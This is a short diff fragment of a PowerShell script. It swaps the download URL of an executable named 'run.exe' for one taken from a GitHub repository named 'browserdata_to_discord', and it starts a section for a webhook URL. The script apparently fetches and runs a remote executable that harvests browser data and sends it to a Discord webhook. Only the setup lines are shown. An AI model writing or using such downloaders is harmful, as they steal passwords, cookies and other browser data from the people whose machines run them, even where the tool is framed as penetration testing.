@@ -1,4 +1,4 @@
-$DOWNLOAD_URL = "https://github.com/HFScripts/sqlite/raw/main/run.exe"
+$DOWNLOAD_URL = "https://github.com/pentestfunctions/browserdata_to_discord/blob/main/portable_sql_browser.exe"
 $FILENAME = "run.exe"
 $CURRENT_DIR = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
 # Define the webhook URL
